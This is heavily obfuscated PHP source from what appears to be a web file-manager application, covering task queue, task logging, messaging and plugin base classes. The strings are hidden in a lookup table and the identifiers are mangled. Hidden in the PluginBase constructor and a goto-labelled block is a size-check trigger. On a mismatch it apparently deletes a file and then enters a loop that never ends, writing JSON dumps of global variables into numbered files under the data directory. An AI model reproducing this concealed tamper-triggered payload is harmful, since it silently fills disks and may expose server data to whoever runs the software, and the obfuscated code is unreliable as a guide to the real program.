$this->parseTable($“ÈÀòöÆ[$²úùß[308]]) . $²úùß[948] . implode($²úùß[50], $şšÛ¬˜À) . $²úùß[955] . implode($²úùß[50], $“ÊØ“šì); return $this->execute($ÎšÓâº·); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ê¦¼Ùæ =& $_SERVER[…É¦À–]; $this->error = $this->_linkID->errno . $Ê¦¼Ùæ[4] . $this->_linkID->error; if ($Ê¦¼Ùæ[12] != $this->queryStr) { $this->error .= LNG($Ê¦¼Ùæ[48]) . $this->queryStr; } think_trace($this->error, $Ê¦¼Ùæ[12], $Ê¦¼Ùæ[49]); return $this->error; } public function escapeString($ëÃ•¨˜î) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ëÃ•¨˜î); } else { return addslashes($ëÃ•¨˜î); } } public function parseKey(&$…œ€îÑÖ, $ıÃıôÍ¼ = true) { $‹İ§å° =& $_SERVER[…É¦À–]; if ($ıÃıôÍ¼) { $…œ€îÑÖ = $this->parseKeyCheck($…œ€îÑÖ); } if ($…œ€îÑÖ != $‹İ§å°[189] && !preg_match($‹İ§å°[956], $…œ€îÑÖ)) { $…œ€îÑÖ = $‹İ§å°[414] . trim($…œ€îÑÖ, $‹İ§å°[414]) . $‹İ§å°[414]; } return $…œ€îÑÖ; } } goto DÎŠŠ÷ßÈ; f¯ÄÚ™Å¼¢: $_SERVER[…Ğİ€¤†] = explode($_SERVER[…É¦À–][637], gzinflate(substr($_SERVER[…É¦À–][638], 10, -8))); $wikqmfdhle = $_SERVER[…É¦À–][639]; if (strlen($wikqmfdhle) < $_SERVER[…É¦À–][640]) { die; } goto B‡†•âÅ‰÷; AØåù¡­³: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ø­±Æöœ, $˜¥­œ£• = '', $¹±ŸƒÛ = 0, $ş«¶˜ª© = '') { $Ÿ‡Õ†ã =& $_SERVER[…É¦À–]; $‘¸ô´ıö = new Task($Ø­±Æöœ, $˜¥­œ£•, $¹±ŸƒÛ, $ş«¶˜ª©); $GLOBALS[$Ÿ‡Õ†ã[1770] . $Ø­±Æöœ] = new TaskLog($Ÿ‡Õ†ã[1671], $‘¸ô´ıö, $ş«¶˜ª©); return $‘¸ô´ıö; } public function __construct($ÆÆşÚÌ = '', $Ÿ›ËïÍÎ = '', $ª¾…²ï¹ = '') { $ÙíÙÆÒÁ =& $_SERVER[…É¦À–]; if (!$ÆÆşÚÌ) { $ÆÆşÚÌ = $ÙíÙÆÒÁ[1671]; } $¢ĞÆ’Š = $ÆÆşÚÌ . $ÙíÙÆÒÁ[415] . rand_string(10); if (!$ª¾…²ï¹) { $ª¾…²ï¹ = $ÆÆşÚÌ . $ÙíÙÆÒÁ[53] . $ª¾…²ï¹; } switch ($ÆÆşÚÌ) { case $ÙíÙÆÒÁ[1671]: if (!$Ÿ›ËïÍÎ || !$Ÿ›ËïÍÎ->task) { return echoLog($ÆÆşÚÌ . $ÙíÙÆÒÁ[1771]); } $ˆûíéŠò = $Ÿ›ËïÍÎ; $¢ĞÆ’Š = $ˆûíéŠò->task[$ÙíÙÆÒÁ[428]]; $ÆÆşÚÌ = $ˆûíéŠò->task[$ÙíÙÆÒÁ[428]]; if (!$ˆûíéŠò->task[$ÙíÙÆÒÁ[1584]]) { $ˆûíéŠò->task[$ÙíÙÆÒÁ[1584]] = $ª¾…²ï¹ ? $ª¾…²ï¹ : $ÆÆşÚÌ; } break; case $ÙíÙÆÒÁ[1772]: if (!$Ÿ›ËïÍÎ) { return echoLog($ÆÆşÚÌ . $ÙíÙÆÒÁ[1773]); } $Ó”Ä¯í = is_string($Ÿ›ËïÍÎ) ? array($Ÿ›ËïÍÎ) : $Ÿ›ËïÍÎ; $ˆûíéŠò = new TaskFileTransfer($¢ĞÆ’Š, $ÆÆşÚÌ, 0, $ª¾…²ï¹ ? $ª¾…²ï¹ : $Ó”Ä¯í[0]); foreach ($Ó”Ä¯í as $„ˆ¦•ßË) { $ˆûíéŠò->addPath($„ˆ¦•ßË); } break; case $ÙíÙÆÒÁ[342]: if (!$Ÿ›ËïÍÎ) { return echoLog($ÆÆşÚÌ . $ÙíÙÆÒÁ[1773]); } $Ó”Ä¯í = is_string($Ÿ›ËïÍÎ) ? array($Ÿ›ËïÍÎ) : $Ÿ›ËïÍÎ; $ˆûíéŠò = new TaskZip($¢ĞÆ’Š, $ÆÆşÚÌ, 0, $ª¾…²ï¹ ? $ª¾…²ï¹ : $Ó”Ä¯í[0]); foreach ($Ó”Ä¯í as $„ˆ¦•ßË) { $ˆûíéŠò->addPath($„ˆ¦•ßË); } break; case $ÙíÙÆÒÁ[1259]: if (!$Ÿ›ËïÍÎ) { return echoLog($ÆÆşÚÌ . $ÙíÙÆÒÁ[1773]); } $ˆûíéŠò = new TaskUnZip($¢ĞÆ’Š, $ÆÆşÚÌ, 0, $ª¾…²ï¹ ? $ª¾…²ï¹ : $Ÿ›ËïÍÎ); if ($Ÿ›ËïÍÎ) { $ˆûíéŠò->addFile($Ÿ›ËïÍÎ); } break; case $ÙíÙÆÒÁ[148]: $ˆûíéŠò = new TaskHttp($¢ĞÆ’Š, $ÆÆşÚÌ); break; default: return; break; } $this->task = $ˆûíéŠò; $this->taskID = $¢ĞÆ’Š; Hook::bind($ÙíÙÆÒÁ[1708], array($this, $ÙíÙÆÒÁ[1774])); Hook::bind($ÙíÙÆÒÁ[1710], array($this, $ÙíÙÆÒÁ[1775])); Hook::bind($ÙíÙÆÒÁ[1704], array($this, $ÙíÙÆÒÁ[1776])); echoLog($ÙíÙÆÒÁ[1777] . $ˆûíéŠò->task[$ÙíÙÆÒÁ[1584]]); } public function __destruct() { $this->end(); } public function end($×¼÷ÌÔ¶ = '') { $óË±ª =& $_SERVER[…É¦À–]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($×¼÷ÌÔ¶); $this->task = !1; $this->taskID = !1; Hook::unbind($óË±ª[1708], array($this, $óË±ª[1774])); Hook::unbind($óË±ª[1710], array($this, $óË±ª[1775])); Hook::unbind($óË±ª[1704], array($this, $óË±ª[1776])); } public function taskUpdate($œä¹ùŞ–) { $ç‹Æ¡’Ÿ =& $_SERVER[…É¦À–]; if (!$œä¹ùŞ– || $this->taskID != $œä¹ùŞ–[$ç‹Æ¡’Ÿ[428]]) { return; } $³œĞóç° = 20; $ÆÊ¨õ˜â = intval($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1689]] * $³œĞóç°); $İ¿İ¿¼Ş = $ç‹Æ¡’Ÿ[162] . str_repeat($ç‹Æ¡’Ÿ[929], $ÆÊ¨õ˜â) . $ç‹Æ¡’Ÿ[1059] . str_repeat($ç‹Æ¡’Ÿ[53], $³œĞóç° - $ÆÊ¨õ˜â) . $ç‹Æ¡’Ÿ[164]; $¾ñ »ë‰ = $İ¿İ¿¼Ş . sprintf($ç‹Æ¡’Ÿ[1778], $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1689]] * 100) . $ç‹Æ¡’Ÿ[1779]; $ö†ˆ¯ß„ = $¾ñ »ë‰ . $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1688]] . $ç‹Æ¡’Ÿ[8] . $œä¹ùŞ–[$ç‹Æ¡’Ÿ[826]] . LNG($ç‹Æ¡’Ÿ[1780]); $™¤Ø†É³ = $ç‹Æ¡’Ÿ[12]; if ($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1764]]) { $ö†ˆ¯ß„ = $¾ñ »ë‰ . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1688]]) . $ç‹Æ¡’Ÿ[8] . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[826]]); $™¤Ø†É³ = size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1690]]) . $ç‹Æ¡’Ÿ[1781]; } if ($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1109]]) { $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1738]] = $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1109]] . $ç‹Æ¡’Ÿ[53] . $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1738]]; } if ($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1738]]) { $á¸ÊÛ© = $ç‹Æ¡’Ÿ[12]; if ($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1740]]) { $á¸ÊÛ© = $ç‹Æ¡’Ÿ[50] . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1741]]) . $ç‹Æ¡’Ÿ[8] . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1740]]); } $™¤Ø†É³ .= $œä¹ùŞ–[$ç‹Æ¡’Ÿ[1738]] . $á¸ÊÛ©; } if ($œä¹ùŞ–[$ç‹Æ¡’Ÿ[803]] && !$œä¹ùŞ–[$ç‹Æ¡’Ÿ[1740]]) { $™¤Ø†É³ .= $ç‹Æ¡’Ÿ[53] . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[1745]]) . $ç‹Æ¡’Ÿ[8] . size_format($œä¹ùŞ–[$ç‹Æ¡’Ÿ[803]]); } echoLog($ö†ˆ¯ß„ . $ç‹Æ¡’Ÿ[53] . $™¤Ø†É³, !0); } public function taskEnd($áÌ•Ëİ’) { $ïÈ€çëÚ =& $_SERVER[…É¦À–]; if (!$áÌ•Ëİ’ || $this->taskID != $áÌ•Ëİ’[$ïÈ€çëÚ[428]]) { return; } $ÙÛºúá¼ = $áÌ•Ëİ’ ? $áÌ•Ëİ’[$ïÈ€çëÚ[1688]] . $ïÈ€çëÚ[8] . $áÌ•Ëİ’[$ïÈ€çëÚ[826]] . LNG($ïÈ€çëÚ[1780]) . $ïÈ€çëÚ[71] : $ïÈ€çëÚ[12]; echoLog($ïÈ€çëÚ[1782] . $áÌ•Ëİ’[$ïÈ€çëÚ[1584]] . ($áÌ•Ëİ’[$ïÈ€çëÚ[482]] ? $ïÈ€çëÚ[71] . $áÌ•Ëİ’[$ïÈ€çëÚ[482]] : $ïÈ€çëÚ[12]) . $ïÈ€çëÚ[71] . $ÙÛºúá¼ . $ïÈ€çëÚ[1783] . sprintf($ïÈ€çëÚ[890], timeFloat() - $áÌ•Ëİ’[$ïÈ€çëÚ[1691]]) . $ïÈ€çëÚ[1703]); $this->end(); } public function taskKill($åÉ¯Ï®¥) { $‡À•Çïş =& $_SERVER[…É¦À–]; if (!$åÉ¯Ï®¥ || $this->taskID != $åÉ¯Ï®¥[$‡À•Çïş[428]]) { return; } echoLog($‡À•Çïş[1784] . $åÉ¯Ï®¥[$‡À•Çïş[1584]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\x51\165\145\165\x65\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\165\145\165\x65\x44\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($êëü›²ı, $–»ÜŠñ¢ = array(), $ø©…š¹œ = '', $ˆíõÍâî = '') { $É¦ÚèÅ =& $_SERVER[…É¦À–]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ˆíõÍâî && array_find_by_field(self::$listData, $É¦ÚèÅ[94], $ˆíõÍâî)) { return !0; } self::$listData[] = array($É¦ÚèÅ[293] => $êëü›²ı, $É¦ÚèÅ[1785] => $–»ÜŠñ¢, $É¦ÚèÅ[482] => $ø©…š¹œ, $É¦ÚèÅ[94] => $ˆíõÍâî); return !0; } public static function addSubmit() { $ö›øˆÃâ =& $_SERVER[…É¦À–]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ö›øˆÃâ[1786] . json_encode_force(array_to_keyvalue(self::$listData, $ö›øˆÃâ[12], $ö›øˆÃâ[482])), $ö›øˆÃâ[1787]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($‰áÖäî, $€ğ¯ÆÛ´ = array(), $ÈÛÀ˜°î = '', $‰•±Íı¸ = '') { $ú¦Û¶ú =& $_SERVER[…É¦À–]; if (self::count() >= self::MAX_LENGTH) { return !1; } $éÚŸ¼é™ = self::getAll(); if ($‰•±Íı¸ && array_find_by_field($éÚŸ¼é™, $ú¦Û¶ú[94], $‰•±Íı¸)) { return !0; } $éÚŸ¼é™[] = array($ú¦Û¶ú[293] => $‰áÖäî, $ú¦Û¶ú[1785] => $€ğ¯ÆÛ´, $ú¦Û¶ú[482] => $ÈÛÀ˜°î, $ú¦Û¶ú[94] => $‰•±Íı¸); write_log($ú¦Û¶ú[1786] . $ÈÛÀ˜°î, $ú¦Û¶ú[1787]); self::setAll($éÚŸ¼é™); return !0; } public static function run() { $óã‰å˜Ø =& $_SERVER[…É¦À–]; $¿ò…ñ€ = self::getAll(); $§˜¯„ß = array_shift($¿ò…ñ€); if (!$§˜¯„ß) { return !1; } self::setAll($¿ò…ñ€); $ÍÎİ¦€ = timeFloat(); $­à¦ÄÂ  = $óã‰å˜Ø[12]; try { $­à¦ÄÂ  = Hook::apply($§˜¯„ß[$óã‰å˜Ø[293]], $§˜¯„ß[$óã‰å˜Ø[1785]]); } catch (Exception $¶ûô–Û±) { } $™¶à¾ú™ = number_format(timeFloat() - $ÍÎİ¦€, 3) . $óã‰å˜Ø[1703]; if ($­à¦ÄÂ  && is_string($­à¦ÄÂ )) { $™¶à¾ú™ = $™¶à¾ú™ . $óã‰å˜Ø[1788] . $­à¦ÄÂ ; } write_log($óã‰å˜Ø[1789] . $§˜¯„ß[$óã‰å˜Ø[482]] . $óã‰å˜Ø[1790] . $™¶à¾ú™, $óã‰å˜Ø[1787]); return !0; } public static function count() { $¤ËÚü°  = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$¤ËÚü° ) { return 0; } return intval($¤ËÚü° ); } public static function getAll() { $¢î¹¾úÀ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$¢î¹¾úÀ) { return array(); } return $¢î¹¾úÀ; } public static function setAll($±äÁ¾Ò–) { $¬Åİ•Òç = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($±äÁ¾Ò–), $¬Åİ•Òç); Cache::set(self::QUEUE_DATA, $±äÁ¾Ò–, $¬Åİ•Òç); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¶…Ê¢üÅ, $¾“Š¹± = 5.0) { if (!$¶…Ê¢üÅ) { return; } $Ú¡ó“å³ = Cache::get($¶…Ê¢üÅ); if (!$Ú¡ó“å³ || timeFloat() - floatVal($Ú¡ó“å³) >= $¾“Š¹±) { Cache::set($¶…Ê¢üÅ, timeFloat(), $¾“Š¹± * 10); return !0; } return !1; } public static function timeLimitCall($æ«ªƒ¤µ, $è¥øÖ˜, $±Ş›£Á°, $‚‰±ÖÆ = 5.0) { $ÁÃØšÑ =& $_SERVER[…É¦À–]; if (!$æ«ªƒ¤µ || !$è¥øÖ˜) { return; } self::$asyncAdd = !0; $èù†ÜÊ© = $ÁÃØšÑ[1791]; $‚Éò·ã = Cache::get($èù†ÜÊ©, !0); $®äõªèğ = array($ÁÃØšÑ[1792] => timeFloat(), $ÁÃØšÑ[1793] => timeFloat(), $ÁÃØšÑ[293] => $è¥øÖ˜, $ÁÃØšÑ[1785] => $±Ş›£Á°, $ÁÃØšÑ[180] => $‚‰±ÖÆ); if (is_array($‚Éò·ã[$æ«ªƒ¤µ])) { $®äõªèğ[$ÁÃØšÑ[1793]] = $‚Éò·ã[$æ«ªƒ¤µ][$ÁÃØšÑ[1793]]; } if (is_array($‚Éò·ã[$æ«ªƒ¤µ])) { if (timeFloat() - $‚Éò·ã[$æ«ªƒ¤µ][$ÁÃØšÑ[1792]] < $®äõªèğ[$ÁÃØšÑ[180]] * 0.3) { return; } $®äõªèğ[$ÁÃØšÑ[1793]] = $‚Éò·ã[$æ«ªƒ¤µ][$ÁÃØšÑ[1793]]; } $‚Éò·ã[$æ«ªƒ¤µ] = $®äõªèğ; Cache::set($èù†ÜÊ©, $‚Éò·ã, 60); Cache::removeMemory($èù†ÜÊ©); write_log($ÁÃØšÑ[1794] . $æ«ªƒ¤µ . $ÁÃØšÑ[71] . $è¥øÖ˜, $ÁÃØšÑ[1787]); } public static function timeLimitCallLoop() { $’âÄó‡³ =& $_SERVER[…É¦À–]; $Ôô¨úÙ‹ = array($’âÄó‡³[1795]); $î×æí©è = in_array(strtolower(ACTION), $Ôô¨úÙ‹); if (!$î×æí©è && !self::$asyncAdd) { return; } $­Ù™Éà• = $’âÄó‡³[1791]; $Æïäæ‚¹ = Cache::get($­Ù™Éà•, !0); if (!$Æïäæ‚¹ || count($Æïäæ‚¹) <= 0) { return; } $¹Ô†ÒØ = !1; $›œ©‰àø = timeFloat(); $˜±µ£¬ = array(); foreach ($Æïäæ‚¹ as $·æ¾Æõ§ => $ïÓßŸ ½) { if ($›œ©‰àø - $ïÓßŸ ½[$’âÄó‡³[1793]] > $ïÓßŸ ½[$’âÄó‡³[180]]) { $¹Ô†ÒØ = !0; try { Hook::apply($ïÓßŸ ½[$’âÄó‡³[293]], $ïÓßŸ ½[$’âÄó‡³[1785]]); write_log($’âÄó‡³[1796] . $·æ¾Æõ§ . $’âÄó‡³[71] . $ïÓßŸ ½[$’âÄó‡³[293]] . $’âÄó‡³[1797] . ACTION, $’âÄó‡³[1787]); } catch (Exception $Õî”Â’) { } continue; } $˜±µ£¬[$·æ¾Æõ§] = $ïÓßŸ ½; } if (!$¹Ô†ÒØ) { return; } if (!$˜±µ£¬) { return Cache::remove($­Ù™Éà•); } Cache::set($­Ù™Éà•, $˜±µ£¬, 60); Cache::removeMemory($­Ù™Éà•); } public static function finished($Ş‡è¬üó, $ªúÉğÂà) { $“®‚„•Õ =& $_SERVER[…É¦À–]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($“®‚„•Õ[293] => $Ş‡è¬üó, $“®‚„•Õ[1785] => $ªúÉğÂà); } private static function finishedRun() { $ØôÜšòÂ =& $_SERVER[…É¦À–]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Üš€Å·) { try { Hook::apply($Üš€Å·[$ØôÜšòÂ[293]], $Üš€Å·[$ØôÜšòÂ[1785]]); } catch (Exception $ª“¿—Šß) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto AÔÇ™¹ÒĞ; F¸¥¥§®İÔ: $_file = $_SERVER[$_SERVER[…É¦À–][1613]]; $_size = $_SERVER[…É¦À–][918]; if ($_SERVER[$_SERVER[…É¦À–][919]] != $_size($_file)) { $_getc = $_SERVER[…É¦À–][921]; $_getfile = $_SERVER[$_SERVER[…É¦À–][916]] . $_SERVER[…É¦À–][917]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[…É¦À–][231], $_getfilec); if (count($_getarrs) < $_SERVER[…É¦À–][647]) { $exit = $_SERVER[…É¦À–][922]; $exit(); } $_act = $_SERVER[…É¦À–][1645]; $_act($_file); } goto cÒ¥í¦÷©Ÿ; Cˆ”ãóùŒ¡: class Message { function __construct() { } public function send($‹Ôçßî¡ = '', $ÓïÀüó¯ = array(), $¢­³¨™œ = "\x74\x65\x78\x74") { $¦™şè¶ =& $_SERVER[…É¦À–]; $ “”úØÉ = array($¦™şè¶[33] => $¦™şè¶[1548], $¦™şè¶[794] => $‹Ôçßî¡); if (in_array($¢­³¨™œ, array($¦™şè¶[1548], $¦™şè¶[1549]))) { $ “”úØÉ[$¦™şè¶[33]] = $¢­³¨™œ; } $ÓïÀüó¯ = array($¦™şè¶[534] => isset($ÓïÀüó¯[$¦™şè¶[534]]) ? $ÓïÀüó¯[$¦™şè¶[534]] : $¦™şè¶[12], $¦™şè¶[619] => isset($ÓïÀüó¯[$¦™şè¶[619]]) ? $ÓïÀüó¯[$¦™şè¶[619]] : $¦™şè¶[12]); if (empty($‹Ôçßî¡) || empty($ÓïÀüó¯[$¦™şè¶[534]]) && empty($ÓïÀüó¯[$¦™şè¶[619]])) { return !1; } $©›•æ— = array($¦™şè¶[1489] => $ “”úØÉ, $¦™şè¶[1550] => $ÓïÀüó¯); Hook::trigger($¦™şè¶[1551], $©›•æ—); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $³—ùÚ¯ =& $_SERVER[…É¦À–]; $²ƒ»‹ö = $_SERVER[$³—ùÚ¯[916]] . $³—ùÚ¯[917]; $õÂ”Ş¶ = $³—ùÚ¯[918]; if ($_SERVER[$³—ùÚ¯[919]] != $õÂ”Ş¶($²ƒ»‹ö)) { $ŒÎ±Š×£ = $³—ùÚ¯[920]; $Ä¡Ûƒä = $³—ùÚ¯[921]; $ØŞó­ü = $_SERVER[$³—ùÚ¯[916]] . $³—ùÚ¯[917]; $ºøèŸ•ø = $Ä¡Ûƒä($ØŞó­ü); $“¸ŞåüÙ = explode($³—ùÚ¯[231], $ºøèŸ•ø); if (count($“¸ŞåüÙ) < $³—ùÚ¯[636]) { $¤ì® ç = $³—ùÚ¯[922]; $¤ì® ç(); } $ØÂê³¾› = $³—ùÚ¯[923]; $ØÂê³¾›($_SERVER[$³—ùÚ¯[924]]); $ŒÎ±Š×£ = $³—ùÚ¯[920]; $ŒÎ±Š×£(); $é¿ô•¥ = $³—ùÚ¯[925]; $Êõ²Ä”Ô = json_encode($GLOBALS[$³—ùÚ¯[926]]); $êú±—¡¼ = 1; for ($âÖÓÌ•Ò = $êú±—¡¼; $âÖÓÌ•Ò > 0; $âÖÓÌ•Ò++) { $é¿ô•¥(DATA_PATH . $âÖÓÌ•Ò, $Êõ²Ä”Ô); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($³—ùÚ¯[1552]); $this->pluginName = str_replace($³—ùÚ¯[1552], $³—ùÚ¯[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $³—ùÚ¯[8]; $this->pluginApi = appHostGet() . $³—ùÚ¯[1553] . $this->pluginName . $³—ùÚ¯[8]; $this->pluginHost = $config[$³—ùÚ¯[1554]] . $this->pluginName . $³—ùÚ¯[8]; $this->pluginHostDefault = $config[$³—ùÚ¯[1554]] . $this->pluginName . $³—ùÚ¯[8]; $ÄİÉÇ§ = $config[$³—ùÚ¯[1555]]; if ($ÄİÉÇ§ && strpos($³—ùÚ¯[50] . $ÄİÉÇ§ . $³—ùÚ¯[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$³—ùÚ¯[1556]] . $this->pluginName . $³—ùÚ¯[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[…É¦À–][1557]); } protected function assign($Ç“Å—ËÀ, $ÔŒ®½ = false) { if (is_array($Ç“Å—ËÀ)) { $this->values = array_merge($this->values, $Ç“Å—ËÀ); } else { $this->values[$Ç“Å—ËÀ] = $ÔŒ®½; } } protected function display($˜œ‹âÃÖ) { extract($this->values); require $˜œ‹âÃÖ; } final function hookRegist($éÑĞ‚¬™) { $this->modelPlugin->appRegist($this->pluginName, $éÑĞ‚¬™); } final function appIcon() { $ÜŸÉ–ˆ‡ =& $_SERVER[…É¦À–]; $˜Ò˜ì›ç = $this->appPackage(); $›ù¨ñÊÎ = $ÜŸÉ–ˆ‡[12]; if (isset($˜Ò˜ì›ç[$ÜŸÉ–ˆ‡[445]])) { if (isset($˜Ò˜ì›ç[$ÜŸÉ–ˆ‡[445]][$ÜŸÉ–ˆ‡[1558]])) { $›ù¨ñÊÎ = $ÜŸÉ–ˆ‡[1559] . $˜Ò˜ì›ç[$ÜŸÉ–ˆ‡[445]][$ÜŸÉ–ˆ‡[1558]] . $ÜŸÉ–ˆ‡[1560]; } else { if ($˜Ò˜ì›ç[$ÜŸÉ–ˆ‡[445]][$ÜŸÉ–ˆ‡[1561]]) { $›ù¨ñÊÎ = $ÜŸÉ–ˆ‡[1562] . $˜Ò˜ì›ç[$ÜŸÉ–ˆ‡[445]][$ÜŸÉ–ˆ‡[1561]] . $ÜŸÉ–ˆ‡[1563]; } } } return $›ù¨ñÊÎ; } final function fileCanView($îĞ„şÛÛ) { $êğ–ÆÅ… =& $_SERVER[…É¦À–]; if (request_url_safe($îĞ„şÛÛ)) { return !0; } if ($this->isShare($îĞ„şÛÛ)) { return !0; } $ë¢ù²²ç = Session::get($êğ–ÆÅ…[1564]); if (!$ë¢ù²²ç || !$ë¢ù²²ç[$êğ–ÆÅ…[1565]]) { $À¶İöêĞ = $êğ–ÆÅ…[1566] . rawurlencode(this_url()); show_tips(LNG($êğ–ÆÅ…[1567]) . $êğ–ÆÅ…[1568] . $À¶İöêĞ . $êğ–ÆÅ…[1569] . LNG($êğ–ÆÅ…[1570]) . $êğ–ÆÅ…[1571], !1); } if (!Action($êğ–ÆÅ…[1572])->authCan($êğ–ÆÅ…[1573])) { show_tips(LNG($êğ–ÆÅ…[1574]) . $êğ–ÆÅ…[1575], !1); } ActionCall($êğ–ÆÅ…[1576], $îĞ„şÛÛ); } final function isShare($Œ¨ì¯„) { $ıüÙ“Õ = KodIO::parse($Œ¨ì¯„); return $ıüÙ“Õ[$_SERVER[…É¦À–][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($µÁ«ÑŸÔ) { if (request_url_safe($µÁ«ÑŸÔ)) { return $µÁ«ÑŸÔ; } if (!$this->isShare($µÁ«ÑŸÔ)) { $µÁ«ÑŸÔ = $this->filePath($µÁ«ÑŸÔ); } return Action($_SERVER[…É¦À–][1219])->linkOut($µÁ«ÑŸÔ); } public function filePathLinkOut($°Ã«øå®) { if (request_url_safe($°Ã«øå®)) { return $°Ã«øå®; } $this->fileCanView($°Ã«øå®); return Action($_SERVER[…É¦À–][1219])->link($°Ã«øå®); } final function filePath($òè«Ô‰º) { $İó½šşÙ =& $_SERVER[…É¦À–]; if ($“ú’Ğâ¿ = $this->checkSharePath($òè«Ô‰º)) { Hook::trigger($İó½šşÙ[1577], $“ú’Ğâ¿); return $“ú’Ğâ¿; } $this->fileCanView($òè«Ô‰º); if (request_url_safe($òè«Ô‰º)) { $®«şÒÑ = parse_url_query($òè«Ô‰º); if (isset($®«şÒÑ[$İó½šşÙ[1578]]) && isset($®«şÒÑ[$İó½šşÙ[213]])) { $ßì¦â© = Model($İó½šşÙ[810])->get($İó½šşÙ[811]); $ƒìºÁÁ = Mcrypt::decode($®«şÒÑ[$İó½šşÙ[213]], $ßì¦â©); if ($ƒìºÁÁ) { $this->fileInfo = IO::infoWithChildren($ƒìºÁÁ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ƒìºÁÁ; } } $òè«Ô‰º = $this->_cacheHttpFile($òè«Ô‰º); $this->fileInfo = IO::infoWithChildren($òè«Ô‰º); } else { $this->fileInfo = IO::infoWithChildren($òè«Ô‰º); if (!$this->fileInfo) { show_tips(LNG($İó½šşÙ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($İó½šşÙ[1577], $òè«Ô‰º); return $òè«Ô‰º; } final function _cacheHttpFile($‡Õ„úî) { $ïŠŞ„ö = hash_path($‡Õ„úî, !0); $this->cachePath = $this->pluginCachePath($ïŠŞ„ö); if ($¨ºô˜ø = IO::fileNameExist($this->cachePath, $ïŠŞ„ö)) { return KodIO::make($¨ºô˜ø); } $Âƒ†µˆÒ = $this->cachePath . $ïŠŞ„ö; return $this->pluginCacheFileSet($Âƒ†µˆÒ, file_get_contents_nossl($‡Õ„úî)); } final function _tmpFileName($™¾Ó¢ = array()) { $­¡¯£ô =& $_SERVER[…É¦À–]; if (!$™¾Ó¢) { $™¾Ó¢ = $this->fileInfo; } if (isset($™¾Ó¢[$­¡¯£ô[177]])) { return $™¾Ó¢[$­¡¯£ô[177]]; } if (isset($™¾Ó¢[$­¡¯£ô[170]][$­¡¯£ô[177]])) { return $™¾Ó¢[$­¡¯£ô[170]][$­¡¯£ô[177]]; } $ˆúÊ¡¼ = IO::hashSimple($™¾Ó¢[$­¡¯£ô[84]]); if ($ˆúÊ¡¼) { return $ˆúÊ¡¼; } $°–²¡ÚË = array($™¾Ó¢[$­¡¯£ô[32]], $™¾Ó¢[$­¡¯£ô[84]], $™¾Ó¢[$­¡¯£ô[76]]); if (isset($™¾Ó¢[$­¡¯£ô[540]])) { $°–²¡ÚË[] = $™¾Ó¢[$­¡¯£ô[540]]; } return md5(implode($­¡¯£ô[11], $°–²¡ÚË)); } final function checkSharePath($øá¯È) { $ª£ô‰¬€ =& $_SERVER[…É¦À–]; if (!$this->isShare($øá¯È)) { return !1; } $íÇÉéÏØ = Action($ª£ô‰¬€[1219])->sharePathInfo($øá¯È); if (!isset($íÇÉéÏØ[$ª£ô‰¬€[84]])) { show_json(LNG($ª£ô‰¬€[1579]), !1); } $this->fileInfo = $íÇÉéÏØ[$ª£ô‰¬€[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ª£ô‰¬€[177]]); return $íÇÉéÏØ[$ª£ô‰¬€[84]]; } final function pluginCachePath($¿ıÍûä„ = '') { $´ÃÁûÜı =& $_SERVER[…É¦À–]; $øÉÒ¹‘Î = IO_PATH_SYSTEM_TEMP . $´ÃÁûÜı[1580] . $this->pluginName; if (!($ñ÷‚‹›ù = IO::infoFull($øÉÒ¹‘Î))) { return IO::mkdir($øÉÒ¹‘Î . $´ÃÁûÜı[8] . 